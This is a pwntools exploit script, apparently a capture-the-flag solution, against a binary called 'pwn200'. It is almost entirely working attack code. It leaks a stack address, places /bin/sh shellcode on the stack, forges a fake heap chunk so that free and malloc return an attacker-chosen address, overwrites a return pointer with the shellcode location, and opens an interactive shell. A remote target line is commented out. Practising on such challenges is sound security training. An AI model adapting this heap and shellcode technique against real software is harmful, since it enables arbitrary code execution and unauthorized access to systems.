from pwn import *

context.log_level = 'debug'
# p = remote('127.0.0.1', 7777)
p = process('./pwn200')

free_got = 0x0000000000602018

shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')

gdb.attach(p)
#part one
payload  = ''
payload += shellcode.ljust(48)

p.recvuntil('who are u?\n')
p.send(payload)
p.recvuntil(payload)

rbp_addr = u64(p.recvn(6).ljust(8, '\x00'))

shellcode_addr = rbp_addr - 0x50 # 20H + 30H
print "shellcode_addr: ", hex(shellcode_addr)
fake_addr = rbp_addr - 0x90 # offset 0x40 to shellcode, 0x400a29 return address


p.recvuntil('give me your id ~~?\n')
p.sendline('32') # id
p.recvuntil('give me money~\n')


#part two
#32bytes padding + prev_size + size + padding + fake_addr
data = p64(0) * 4 + p64(0) + p64(0x41)		# no strcpy
data = data.ljust(56, '\x00') + p64(fake_addr)
print data
p.send(data)

p.recvuntil('choice : ')
p.sendline('2') 	# free(fake_addr)

p.recvuntil('choice : ')
p.sendline('1') 	#malloc(fake_addr) #fake_addr

p.recvuntil('long?')
p.sendline('48')    # 48 + 16 = 64 = 0x40
p.recvline('48')    # ptr = malloc(48) 

data = 'a' * 0x18 + p64(shellcode_addr) # write to target_addr
data = data.ljust(48, '\x00')

p.send(data)

p.recvuntil('choice')
p.sendline('3')

p.interactive()
